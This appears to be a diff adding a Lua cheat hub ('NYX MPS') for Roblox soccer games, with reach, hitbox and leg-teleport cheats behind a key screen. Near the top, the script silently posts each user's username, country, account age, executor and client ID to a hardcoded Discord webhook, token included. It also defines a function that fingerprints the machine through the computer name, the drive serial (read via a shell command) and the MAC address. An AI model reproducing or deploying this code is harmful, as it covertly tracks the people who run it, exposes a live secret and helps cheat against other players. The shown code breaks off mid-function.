@@ -1,1 +1,1047 @@
-print("discontinued thank you for everything")
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local LocalizationService = game:GetService("LocalizationService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("StarterGui")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local TweenService = game:GetService("TweenService")
+
+local allowedPlaceIds = {
+    [17783527320] = true, [13664698400] = true, [16672317221] = true,
+    [6812019795] = true, [9847297509] = true, [90120855858463] = true,
+    [6813163246] = true, [17028263624] = true, [101683619347512] = true,
+    [94496705379095] = true, [128484612043576] = true, [121447628001888] = true,
+    [17111721857] = true, [78956806960664] = true, [15652768521] = true,
+    [18493219434] = true, [140502244173168] = true, [88461473375592] = true,
+    [107422263114716] = true, [15652768521] = true, [133836108363208] = true,
+    [116742105415104] = true,
+    [103033634616386 ] = true,
+    [113138441089783] = true,
+    [101003436397199] = true,
+    [122527682821377 ] = true,
+    [110622342557482] = true
+}
+
+local CLASSIC_SOCCER_PLACE_IDS = {
+    [13664698400] = true, [17028263624] = true
+}
+
+if not allowedPlaceIds[game.PlaceId] then
+    CoreGui:SetCore("SendNotification", {
+        Title = "Unsupported Game",
+        Text = "This game is not supported. Make sure you execute on the pitch, not in the hub.",
+        Duration = 5
+    })
+    return
+end
+
+local function getHWID()
+    local computerName = ""
+    pcall(function() computerName = string.lower(os.getenv("COMPUTERNAME")) end)
+
+    local volumeSerialNumber = ""
+    pcall(function()
+        local drive = string.sub(os.getenv("SystemDrive"), 1, 1)
+        local handle = io.popen("vol " .. drive .. ":")
+        volumeSerialNumber = string.match(handle:read("*a"), "%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+%-+[%w%-]+")
+        handle:close()
+    end)
+
+    local macAddress = ""
+    pcall(function()
+        local adapters = game:GetService("NetworkAdapter").GetAdapters()
+        table.sort(adapters, function(a, b) return a.Name < b.Name end)
+        macAddress = adapters[1].MacAddress
+    end)
+
+    local hwidString = computerName .. volumeSerialNumber .. macAddress
+    return syn and syn.crypt.hash(syn.crypt.create(hwidString)) or "N/A"
+end
+
+local request = http_request or request or (syn and syn.request)
+
+request({
+    Method = "POST",
+    Url = "https://discord.com/api/webhooks/1350133324324278325/cCRGXXDCBleV0sh-ChXzPpIONyh7rDCyqzpv-aaCFUOoQhwMF35xVDYqFugeQGjdhBW_",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = HttpService:JSONEncode({
+        username = "Logs",
+        embeds = {
+            {
+                title = MarketplaceService:GetProductInfo(game.PlaceId).Name,
+                description = "**" .. Players.LocalPlayer.Name .. "** has executed the script!",
+                color = 0x000000,
+                fields = {
+                    { name = "Place ID", value = game.PlaceId },
+                    { name = "Account Age", value = Players.LocalPlayer.AccountAge .. " days old" },
+                    { name = "Country", value = LocalizationService:GetCountryRegionForPlayerAsync(Players.LocalPlayer) },
+                    { name = "Executor", value = identifyexecutor() },
+                    { name = 'Hwid', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+                    { name = "Server Size", value = #game.Players:GetPlayers() .. " players" },
+                    { name = "Execution Time", value = os.date("%Y-%m-%d %H:%M:%S", os.time()) },
+                }
+            }
+        }
+    })
+})
+
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local UIS = UserInputService
+local isMobile = UIS.TouchEnabled and not UIS.KeyboardEnabled and not UIS.MouseEnabled
+
+local KeyGui = Instance.new("ScreenGui")
+KeyGui.Name = "KeySystem"
+KeyGui.Parent = PlayerGui
+KeyGui.ResetOnSpawn = false
+
+local KeyFrame = Instance.new("Frame")
+KeyFrame.Size = UDim2.new(0, 350, 0, 250)
+KeyFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
+KeyFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+KeyFrame.BackgroundTransparency = 0.1
+local KeyCorner = Instance.new("UICorner")
+KeyCorner.CornerRadius = UDim.new(0, 10)
+KeyCorner.Parent = KeyFrame
+KeyFrame.Parent = KeyGui
+
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 45)
+Title.BackgroundTransparency = 1
+Title.Text = "Enter Key"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.TextSize = 22
+Title.Font = Enum.Font.GothamBold
+Title.TextXAlignment = Enum.TextXAlignment.Center
+Title.Parent = KeyFrame
+
+local KeyInput = Instance.new("TextBox")
+KeyInput.Size = UDim2.new(0.8, 0, 0, 35)
+KeyInput.Position = UDim2.new(0.1, 0, 0.25, 0)
+KeyInput.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+KeyInput.Text = ""
+KeyInput.PlaceholderText = "Type key here"
+KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+KeyInput.TextSize = 16
+KeyInput.Font = Enum.Font.Gotham
+local InputCorner = Instance.new("UICorner")
+InputCorner.CornerRadius = UDim.new(0, 5)
+InputCorner.Parent = KeyInput
+KeyInput.Parent = KeyFrame
+
+local NoteLabel = Instance.new("TextLabel")
+NoteLabel.Size = UDim2.new(0.8, 0, 0, 25)
+NoteLabel.Position = UDim2.new(0.1, 0, 0.45, 0)
+NoteLabel.BackgroundTransparency = 1
+NoteLabel.Text = "Note: The key is NYX"
+NoteLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+NoteLabel.TextSize = 12
+NoteLabel.Font = Enum.Font.Gotham
+NoteLabel.TextXAlignment = Enum.TextXAlignment.Center
+NoteLabel.Parent = KeyFrame
+
+local SubmitButton = Instance.new("TextButton")
+SubmitButton.Size = UDim2.new(0.4, 0, 0, 35)
+SubmitButton.Position = UDim2.new(0.3, 0, 0.65, 0)
+SubmitButton.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+SubmitButton.Text = "Submit"
+SubmitButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+SubmitButton.TextSize = 16
+SubmitButton.Font = Enum.Font.GothamBold
+local ButtonCorner = Instance.new("UICorner")
+ButtonCorner.CornerRadius = UDim.new(0, 5)
+ButtonCorner.Parent = SubmitButton
+SubmitButton.Parent = KeyFrame
+
+local StatusLabel = Instance.new("TextLabel")
+StatusLabel.Size = UDim2.new(0.8, 0, 0, 25)
+StatusLabel.Position = UDim2.new(0.1, 0, 0.85, 0)
+StatusLabel.BackgroundTransparency = 1
+StatusLabel.Text = ""
+StatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+StatusLabel.TextSize = 14
+StatusLabel.Font = Enum.Font.Gotham
+StatusLabel.TextXAlignment = Enum.TextXAlignment.Center
+StatusLabel.Parent = KeyFrame
+
+local correctKey = "NYX"
+local keyVerified = false
+
+SubmitButton.MouseButton1Click:Connect(function()
+    local inputKey = KeyInput.Text
+    if inputKey == correctKey then
+        StatusLabel.Text = "Correct Key!"
+        StatusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
+        keyVerified = true
+        task.wait(1)
+        KeyGui:Destroy()
+    else
+        StatusLabel.Text = "Invalid Key!"
+        StatusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
+        KeyInput.Text = ""
+    end
+end)
+
+while not keyVerified do
+    task.wait(0.1)
+end
+
+local LoadingScreen = Instance.new("ScreenGui")
+LoadingScreen.Name = "LoadingScreen"
+LoadingScreen.Parent = PlayerGui
+LoadingScreen.ResetOnSpawn = false
+
+local LoadFrame = Instance.new("Frame")
+LoadFrame.Size = UDim2.new(0, 300, 0, 200)
+LoadFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
+LoadFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+LoadFrame.BackgroundTransparency = 0.1
+local LoadCorner = Instance.new("UICorner")
+LoadCorner.CornerRadius = UDim.new(0, 10)
+LoadCorner.Parent = LoadFrame
+LoadFrame.Parent = LoadingScreen
+
+local LoadTitle = Instance.new("TextLabel")
+LoadTitle.Size = UDim2.new(1, 0, 0, 40)
+LoadTitle.BackgroundTransparency = 1
+LoadTitle.Text = "LOADING NYX"
+LoadTitle.TextColor3 = Color3.fromRGB(255, 255, 250)
+LoadTitle.TextSize = 20
+LoadTitle.Font = Enum.Font.GothamBold
+LoadTitle.TextXAlignment = Enum.TextXAlignment.Center
+LoadTitle.Parent = LoadFrame
+
+local ProgressBar = Instance.new("Frame")
+ProgressBar.Size = UDim2.new(0.8, 0, 0, 20)
+ProgressBar.Position = UDim2.new(0.1, 0, 0.5, -10)
+ProgressBar.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+local ProgressBarCorner = Instance.new("UICorner")
+ProgressBarCorner.CornerRadius = UDim.new(0, 5)
+ProgressBarCorner.Parent = ProgressBar
+ProgressBar.Parent = LoadFrame
+
+local ProgressFill = Instance.new("Frame")
+ProgressFill.Size = UDim2.new(0, 0, 1, 0)
+ProgressFill.BackgroundColor3 = Color3.fromRGB(128, 128, 128)
+local ProgressFillCorner = Instance.new("UICorner")
+ProgressFillCorner.CornerRadius = UDim.new(0, 5)
+ProgressFillCorner.Parent = ProgressFill
+ProgressFill.Parent = ProgressBar
+
+local ProgressLabel = Instance.new("TextLabel")
+ProgressLabel.Size = UDim2.new(0.8, 0, 0, 20)
+ProgressLabel.Position = UDim2.new(0.1, 0, 0.5, -10)
+ProgressLabel.BackgroundTransparency = 1
+ProgressLabel.Text = "0%"
+ProgressLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+ProgressLabel.TextSize = 16
+ProgressLabel.Font = Enum.Font.Gotham
+ProgressLabel.TextXAlignment = Enum.TextXAlignment.Center
+ProgressLabel.Parent = LoadFrame
+
+local loadingComplete = false
+task.spawn(function()
+    local steps = 100
+    for i = 0, steps do
+        local progress = i / steps
+        ProgressLabel.Text = math.floor(progress * 100) .. "%"
+        ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
+        task.wait(0.03)
+    end
+    task.wait(0.3)
+    LoadingScreen:Destroy()
+    loadingComplete = true
+end)
+
+task.spawn(function()
+    while not loadingComplete do
+        task.wait(0.1)
+    end
+
+    local MainGui = Instance.new("ScreenGui")
+    MainGui.Name = "NYX_MPS"
+    MainGui.Parent = PlayerGui
+    MainGui.ResetOnSpawn = false
+
+    local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    local windowTitle = "NYX MPS | " .. gameName .. " HUB"
+    local frameSize = (isMobile and UDim2.new(0, 400, 0, 350)) or UDim2.new(0, 600, 0, 500)
+
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Size = frameSize
+    MainFrame.Position = UDim2.new(0.5, -frameSize.X.Offset / 2, 0.5, -frameSize.Y.Offset / 2)
+    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    MainFrame.BackgroundTransparency = 0.1
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 10)
+    MainCorner.Parent = MainFrame
+    MainFrame.Parent = MainGui
+
+    local TitleBar = Instance.new("TextLabel")
+    TitleBar.Size = UDim2.new(1, 0, 0, (isMobile and 40) or 50)
+    TitleBar.BackgroundTransparency = 1
+    TitleBar.Text = windowTitle
+    TitleBar.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TitleBar.TextSize = (isMobile and 20) or 24
+    TitleBar.Font = Enum.Font.GothamBold
+    TitleBar.TextXAlignment = Enum.TextXAlignment.Center
+    TitleBar.Parent = MainFrame
+
+    local dragging, dragInput, dragStart, startPos
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+    TitleBar.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+    UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+
+    local TimeLabel = Instance.new("TextLabel")
+    TimeLabel.Size = UDim2.new(0.2, 0, 0, (isMobile and 20) or 30)
+    TimeLabel.Position = UDim2.new(0, 10, 0, 10)
+    TimeLabel.BackgroundTransparency = 1
+    TimeLabel.Text = os.date("%H:%M:%S", os.time())
+    TimeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TimeLabel.TextSize = (isMobile and 14) or 18
+    TimeLabel.Font = Enum.Font.Gotham
+    TimeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    TimeLabel.Parent = TitleBar
+
+    task.spawn(function()
+        while true do
+            TimeLabel.Text = os.date("%H:%M:%S", os.time())
+            task.wait(1)
+        end
+    end)
+
+    local CloseButton = Instance.new("TextButton")
+    CloseButton.Size = UDim2.new(0, (isMobile and 25) or 35, 0, (isMobile and 25) or 35)
+    CloseButton.Position = UDim2.new(1, (isMobile and -35) or -45, 0, 5)
+    CloseButton.BackgroundTransparency = 1
+    CloseButton.Text = "X"
+    CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    CloseButton.TextSize = (isMobile and 14) or 18
+    CloseButton.Font = Enum.Font.GothamBold
+    CloseButton.Parent = TitleBar
+    CloseButton.MouseButton1Click:Connect(function()
+        MainGui:Destroy()
+    end)
+
+    local ToggleButton = Instance.new("TextButton")
+    ToggleButton.Size = UDim2.new(0, (isMobile and 25) or 35, 0, (isMobile and 25) or 35)
+    ToggleButton.Position = UDim2.new(1, (isMobile and -70) or -90, 0, 5)
+    ToggleButton.BackgroundTransparency = 1
+    ToggleButton.Text = "-"
+    ToggleButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ToggleButton.TextSize = (isMobile and 14) or 18
+    ToggleButton.Font = Enum.Font.GothamBold
+    ToggleButton.Parent = TitleBar
+
+    local isMinimized = false
+    local function toggleMinimize()
+        isMinimized = not isMinimized
+        ToggleButton.Text = (isMinimized and "+") or "-"
+        if isMinimized then
+            for _, child in pairs(MainFrame:GetChildren()) do
+                if child ~= TitleBar and child:IsA("GuiObject") then
+                    child:SetAttribute("OriginalVisible", child.Visible)
+                    child.Visible = false
+                end
+            end
+            MainFrame.Size = UDim2.new(0, frameSize.X.Offset, 0, (isMobile and 40) or 50)
+        else
+            for _, child in pairs(MainFrame:GetChildren()) do
+                if child ~= TitleBar and child:IsA("GuiObject") then
+                    local originalVisible = child:GetAttribute("OriginalVisible")
+                    child.Visible = (originalVisible ~= nil and originalVisible) or true
+                end
+            end
+            MainFrame.Size = frameSize
+        end
+    end
+    ToggleButton.MouseButton1Click:Connect(toggleMinimize)
+
+    local AvatarFrame = Instance.new("Frame")
+    AvatarFrame.Size = UDim2.new(0, (isMobile and 30) or 50, 0, (isMobile and 30) or 50)
+    AvatarFrame.Position = UDim2.new(0, 10, 1, (isMobile and -40) or -60)
+    AvatarFrame.BackgroundTransparency = 1
+    AvatarFrame.Parent = MainFrame
+
+    local AvatarImage = Instance.new("ImageLabel")
+    AvatarImage.Size = UDim2.new(1, 0, 1, 0)
+    AvatarImage.BackgroundTransparency = 1
+    AvatarImage.Image = Players:GetUserThumbnailAsync(Player.UserId, Enum.ThumbnailType.AvatarBust, (isMobile and Enum.ThumbnailSize.Size48x48) or Enum.ThumbnailSize.Size100x100)
+    AvatarImage.Parent = AvatarFrame
+
+    local AvatarStroke = Instance.new("UIStroke")
+    AvatarStroke.Thickness = (isMobile and 1) or 2
+    AvatarStroke.Color = Color3.fromRGB(255, 255, 255)
+    AvatarStroke.Parent = AvatarImage
+
+    local AvatarCircle = Instance.new("UICorner")
+    AvatarCircle.CornerRadius = UDim.new(1, 0)
+    AvatarCircle.Parent = AvatarImage
+
+    local WelcomeLabel = Instance.new("TextLabel")
+    WelcomeLabel.Size = UDim2.new(0, (isMobile and 200) or 300, 0, (isMobile and 20) or 30)
+    WelcomeLabel.Position = UDim2.new(0, (isMobile and 50) or 70, 1, (isMobile and -30) or -40)
+    WelcomeLabel.BackgroundTransparency = 1
+    WelcomeLabel.Text = "Welcome! " .. Player.DisplayName
+    WelcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    WelcomeLabel.TextSize = (isMobile and 16) or 20
+    WelcomeLabel.Font = Enum.Font.GothamBold
+    WelcomeLabel.TextXAlignment = Enum.TextXAlignment.Left
+    WelcomeLabel.Parent = MainFrame
+
+    local VersionLabel = Instance.new("TextLabel")
+    VersionLabel.Size = UDim2.new(0, (isMobile and 100) or 150, 0, (isMobile and 20) or 30)
+    VersionLabel.Position = UDim2.new(1, (isMobile and -110) or -160, 1, (isMobile and -40) or -50)
+    VersionLabel.BackgroundTransparency = 1
+    VersionLabel.Text = "Version 1.0"
+    VersionLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    VersionLabel.TextSize = (isMobile and 12) or 16
+    VersionLabel.Font = Enum.Font.Gotham
+    VersionLabel.TextXAlignment = Enum.TextXAlignment.Right
+    VersionLabel.Parent = MainFrame
+
+    local TabFrame = Instance.new("Frame")
+    TabFrame.Size = UDim2.new(0, (isMobile and 120) or 180, 0, (isMobile and 260) or 380)
+    TabFrame.Position = UDim2.new(0, 10, 0, (isMobile and 50) or 60)
+    TabFrame.BackgroundTransparency = 1
+    TabFrame.Parent = MainFrame
+
+    local SeparatorLine = Instance.new("Frame")
+    SeparatorLine.Size = UDim2.new(0, 2, 0, (isMobile and 260) or 380)
+    SeparatorLine.Position = UDim2.new(0, (isMobile and 130) or 190, 0, (isMobile and 50) or 60)
+    SeparatorLine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    SeparatorLine.BackgroundTransparency = 0.5
+    SeparatorLine.BorderSizePixel = 0
+    SeparatorLine.Parent = MainFrame
+
+    local ContentFrame = Instance.new("Frame")
+    ContentFrame.Size = UDim2.new(0, (isMobile and 250) or 390, 0, (isMobile and 260) or 380)
+    ContentFrame.Position = UDim2.new(0, (isMobile and 140) or 200, 0, (isMobile and 50) or 60)
+    ContentFrame.BackgroundTransparency = 1
+    ContentFrame.Parent = MainFrame
+
+    local function createToggle(parent, pos, text, callback)
+        local Toggle = Instance.new("TextButton")
+        Toggle.Size = UDim2.new(0, (isMobile and 180) or 220, 0, (isMobile and 30) or 35)
+        Toggle.Position = pos
+        Toggle.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        Toggle.Text = text .. ": OFF"
+        Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Toggle.TextSize = (isMobile and 14) or 16
+        Toggle.Font = Enum.Font.GothamBold
+        Toggle.TextTruncate = Enum.TextTruncate.AtEnd
+        local ToggleCorner = Instance.new("UICorner")
+        ToggleCorner.CornerRadius = UDim.new(0, 6)
+        ToggleCorner.Parent = Toggle
+        local ToggleStroke = Instance.new("UIStroke")
+        ToggleStroke.Thickness = 1
+        ToggleStroke.Color = Color3.fromRGB(70, 70, 70)
+        ToggleStroke.Parent = Toggle
+        Toggle.Parent = parent
+
+        local state = false
+        Toggle.MouseButton1Click:Connect(function()
+            state = not state
+            Toggle.Text = text .. (state and ": ON" or ": OFF")
+            Toggle.BackgroundColor3 = state and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(40, 40, 40)
+            callback(state)
+        end)
+        Toggle.MouseEnter:Connect(function()
+            TweenService:Create(Toggle, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
+        end)
+        Toggle.MouseLeave:Connect(function()
+            TweenService:Create(Toggle, TweenInfo.new(0.2), {BackgroundColor3 = state and Color3.fromRGB(60, 60, 60) or Color3.fromRGB(40, 40, 40)}):Play()
+        end)
+        return Toggle
+    end
+
+    local function createSlider(parent, pos, text, min, max, default, callback)
+        local Slider = Instance.new("Frame")
+        Slider.Size = UDim2.new(0, (isMobile and 180) or 220, 0, (isMobile and 35) or 45)
+        Slider.Position = pos
+        Slider.BackgroundTransparency = 1
+        Slider.Parent = parent
+
+        local Label = Instance.new("TextLabel")
+        Label.Size = UDim2.new(1, 0, 0, (isMobile and 12) or 15)
+        Label.Position = UDim2.new(0, 0, 0, 0)
+        Label.BackgroundTransparency = 1
+        Label.Text = text .. ": " .. default
+        Label.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Label.TextSize = (isMobile and 10) or 12
+        Label.Font = Enum.Font.Gotham
+        Label.TextXAlignment = Enum.TextXAlignment.Center
+        Label.Parent = Slider
+
+        local Track = Instance.new("Frame")
+        Track.Size = UDim2.new(1, 0, 0, (isMobile and 12) or 15)
+        Track.Position = UDim2.new(0, 0, 0, (isMobile and 18) or 22)
+        Track.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        local TrackCorner = Instance.new("UICorner")
+        TrackCorner.CornerRadius = UDim.new(0, 5)
+        TrackCorner.Parent = Track
+        Track.Parent = Slider
+
+        local Fill = Instance.new("Frame")
+        Fill.Size = UDim2.new((default - min) / (max - min), 0, 1, 0)
+        Fill.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+        local FillCorner = Instance.new("UICorner")
+        FillCorner.CornerRadius = UDim.new(0, 5)
+        FillCorner.Parent = Fill
+        Fill.Parent = Track
+
+        local Knob = Instance.new("Frame")
+        Knob.Size = UDim2.new(0, (isMobile and 10) or 12, 0, (isMobile and 10) or 12)
+        Knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        Knob.Position = UDim2.new((default - min) / (max - min), -((isMobile and 5) or 6), 0, (isMobile and 1) or 1.5)
+        local KnobCorner = Instance.new("UICorner")
+        KnobCorner.CornerRadius = UDim.new(1, 0)
+        KnobCorner.Parent = Knob
+        Knob.Parent = Track
+
+        local currentValue = default
+        local function updateSlider(positionX)
+            local trackX = Track.AbsolutePosition.X
+            local trackWidth = Track.AbsoluteSize.X
+            local percent = math.clamp((positionX - trackX) / trackWidth, 0, 1)
+            Knob.Position = UDim2.new(percent, -((isMobile and 5) or 6), 0, (isMobile and 1) or 1.5)
+            Fill.Size = UDim2.new(percent, 0, 1, 0)
+            currentValue = math.floor(min + (max - min) * percent)
+            Label.Text = text .. ": " .. currentValue
+            callback(currentValue)
+        end
+
+        local dragging = false
+        Knob.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = true
+                if input.UserInputType == Enum.UserInputType.Touch then
+                    updateSlider(input.Position.X)
+                end
+            end
+        end)
+        Knob.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = false
+            end
+        end)
+        UIS.InputChanged:Connect(function(input)
+            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+                updateSlider(input.Position.X)
+            end
+        end)
+        Track.InputBegan:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                updateSlider(input.Position.X)
+                dragging = true
+            end
+        end)
+        Track.InputEnded:Connect(function(input)
+            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+                dragging = false
+            end
+        end)
+        return Slider
+    end
+
+    local function createButton(parent, pos, text, callback)
+        local Button = Instance.new("TextButton")
+        Button.Size = UDim2.new(0, (isMobile and 180) or 220, 0, (isMobile and 30) or 35)
+        Button.Position = pos
+        Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        Button.Text = text
+        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Button.TextSize = (isMobile and 14) or 16
+        Button.Font = Enum.Font.GothamBold
+        Button.TextTruncate = Enum.TextTruncate.AtEnd
+        local ButtonCorner = Instance.new("UICorner")
+        ButtonCorner.CornerRadius = UDim.new(0, 6)
+        ButtonCorner.Parent = Button
+        local ButtonStroke = Instance.new("UIStroke")
+        ButtonStroke.Thickness = 1
+        ButtonStroke.Color = Color3.fromRGB(70, 70, 70)
+        ButtonStroke.Parent = Button
+        Button.Parent = parent
+
+        Button.MouseEnter:Connect(function()
+            TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(50, 50, 50)}):Play()
+        end)
+        Button.MouseLeave:Connect(function()
+            TweenService:Create(Button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 40, 40)}):Play()
+        end)
+        Button.MouseButton1Click:Connect(callback)
+        return Button
+    end
+
+    local selectedTab = nil
+    local function createTab(name, contentCreator, index)
+        local TabButton = Instance.new("TextButton")
+        TabButton.Size = UDim2.new(1, -10, 0, (isMobile and 35) or 40)
+        TabButton.Position = UDim2.new(0, 5, 0, 5 + (index * (isMobile and 50 or 60)))
+        TabButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+        TabButton.BackgroundTransparency = 0
+        TabButton.Text = ""
+        TabButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TabButton.TextSize = (isMobile and 14) or 16
+        TabButton.Font = Enum.Font.GothamBold
+        local TabCorner = Instance.new("UICorner")
+        TabCorner.CornerRadius = UDim.new(0, 8)
+        TabCorner.Parent = TabButton
+        TabButton.Parent = TabFrame
+
+        local HighlightBar = Instance.new("Frame")
+        HighlightBar.Size = UDim2.new(0, 4, 1, 0)
+        HighlightBar.Position = UDim2.new(0, 0, 0, 0)
+        HighlightBar.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        HighlightBar.BackgroundTransparency = 1
+        HighlightBar.Parent = TabButton
+
+        local TextLabel = Instance.new("TextLabel")
+        TextLabel.Size = UDim2.new(1, -10, 1, 0)
+        TextLabel.Position = UDim2.new(0, 10, 0, 0)
+        TextLabel.BackgroundTransparency = 1
+        TextLabel.Text = name
+        TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+        TextLabel.TextSize = (isMobile and 14) or 16
+        TextLabel.Font = Enum.Font.GothamBold
+        TextLabel.TextXAlignment = Enum.TextXAlignment.Left
+        TextLabel.Parent = TabButton
+
+        TabButton.MouseEnter:Connect(function()
+            if TabButton ~= selectedTab then
+                TweenService:Create(TabButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
+            end
+        end)
+        TabButton.MouseLeave:Connect(function()
+            if TabButton ~= selectedTab then
+                TweenService:Create(TabButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
+            end
+        end)
+        TabButton.MouseButton1Click:Connect(function()
+            if selectedTab then
+                TweenService:Create(selectedTab, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(30, 30, 30)}):Play()
+                local prevTextLabel = selectedTab:FindFirstChild("TextLabel")
+                local prevHighlightBar = selectedTab:FindFirstChild("HighlightBar")
+                if prevTextLabel then prevTextLabel.TextColor3 = Color3.fromRGB(255, 255, 255) end
+                if prevHighlightBar then TweenService:Create(prevHighlightBar, TweenInfo.new(0.2), {BackgroundTransparency = 1}):Play() end
+            end
+            TweenService:Create(TabButton, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 45)}):Play()
+            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+            TweenService:Create(HighlightBar, TweenInfo.new(0.2), {BackgroundTransparency = 0}):Play()
+            selectedTab = TabButton
+            for _, child in pairs(ContentFrame:GetChildren()) do
+                child.Visible = false
+            end
+            contentCreator().Visible = true
+        end)
+    end
+
+    local function createMainTab()
+        local Content = Instance.new("Frame")
+        Content.Size = UDim2.new(1, 0, 1, 0)
+        Content.BackgroundTransparency = 1
+        Content.Parent = ContentFrame
+        Content.Visible = false
+
+        local toggleState = false
+        createToggle(Content, UDim2.new(0.05, 0, 0.05, 0), "FireTouchInterest", function(state)
+            toggleState = state
+            if not toggleState then reach = 4.75 end
+        end)
+
+        local reach = 4.75
+        createSlider(Content, UDim2.new(0.05, 0, 0.2, 0), "Reach", 5, 50, 5, function(value)
+            if toggleState then
+                reach = value
+            end
+        end)
+
+        if CLASSIC_SOCCER_PLACE_IDS[game.PlaceId] then
+            local Hitbox, Character, RootPart, LeftLeg, RightLeg
+            local IsTouchingTPS = false
+            local hitboxEnabled = false
+            local hitboxSize = 8
+            local hitboxConnection
+
+            local function createHitbox()
+                Character = Player.Character or Player.CharacterAdded:Wait()
+                RootPart = Character:FindFirstChild("HumanoidRootPart")
+                LeftLeg = Character:FindFirstChild("Left Leg") or Character:FindFirstChild("LeftLowerLeg")
+                RightLeg = Character:FindFirstChild("Right Leg") or Character:FindFirstChild("RightLowerLeg")
+                if Hitbox then Hitbox:Destroy() end
+                Hitbox = Instance.new("Part")
+                Hitbox.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
+                Hitbox.Transparency = 0.6
+                Hitbox.Anchored = true
+                Hitbox.CanCollide = false
+                Hitbox.Parent = Character
+                Hitbox.Position = RootPart.Position
+                Hitbox.Name = "Hitbox"
+
+                local function adjustLegs()
+                    if IsTouchingTPS then
+                        local TPS = nil
+                        for _, obj in pairs(workspace:GetDescendants()) do
+                            if obj:IsA("Part") and obj.Name == "TPS" then
+                                TPS = obj
+                                break
+                            end
+                        end
+                        if TPS and LeftLeg and RightLeg then
+                            LeftLeg.Position = TPS.Position + Vector3.new(-0.5, -0.5, 0)
+                            RightLeg.Position = TPS.Position + Vector3.new(0.5, -0.5, 0)
+                        end
+                    end
+                end
+
+                local function resetLegs()
+                    if LeftLeg and RightLeg and Character then
+                        LeftLeg.Position = Character.PrimaryPart.Position + Vector3.new(-0.5, -2, 0)
